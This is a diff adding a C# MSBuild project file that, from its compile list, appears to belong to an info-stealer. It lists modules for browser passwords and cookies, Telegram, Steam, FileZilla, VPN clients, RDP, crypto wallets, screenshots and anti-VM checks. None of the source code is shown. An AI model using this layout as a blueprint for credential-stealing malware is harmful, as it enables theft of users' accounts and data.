@@ -1,0 +1,85 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{4839747B-CB0E-41FE-B423-F81DEABE1562}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>ConsoleApp1</RootNamespace>
+    <AssemblyName>ConsoleApp1</AssemblyName>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <StartupObject>White.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="bitdomain\dnschange.cs" />
+    <Compile Include="brtest\browserstest.cs" />
+    <Compile Include="c0unt\count.cs" />
+    <Compile Include="cr\crypto.cs" />
+    <Compile Include="d3sktop\desktop.cs" />
+    <Compile Include="dLL\dll.cs" />
+    <Compile Include="f1lezilla\filezilla.cs" />
+    <Compile Include="file\AutoFillData.cs" />
+    <Compile Include="file\SteamHelper.cs" />
+    <Compile Include="hw1d\hwid.cs" />
+    <Compile Include="jaber\jabber.cs" />
+    <Compile Include="killer\killerr.cs" />
+    <Compile Include="Nordvpn\nord.cs" />
+    <Compile Include="opvpn\ovpn.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="prtvpn\protonvpn.cs" />
+    <Compile Include="rDr\rdp.cs" />
+    <Compile Include="Screen\ScreenShot.cs" />
+    <Compile Include="skypemsg\skype.cs" />
+    <Compile Include="sql\SqlHandler.cs" />
+    <Compile Include="Stealer\Browsers.cs" />
+    <Compile Include="Stealer\CookieData.cs" />
+    <Compile Include="Stealer\Files.cs" />
+    <Compile Include="Stealer\Helper.cs" />
+    <Compile Include="Stealer\LogPassData.cs" />
+    <Compile Include="Stealer\SQL.cs" />
+    <Compile Include="steam1\steam.cs" />
+    <Compile Include="tdata\telegram.cs" />
+    <Compile Include="trashman\trash.cs" />
+    <Compile Include="White\AntiVM.cs" />
+    <Compile Include="White\NativeMethods.cs" />
+    <Compile Include="White\Program.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
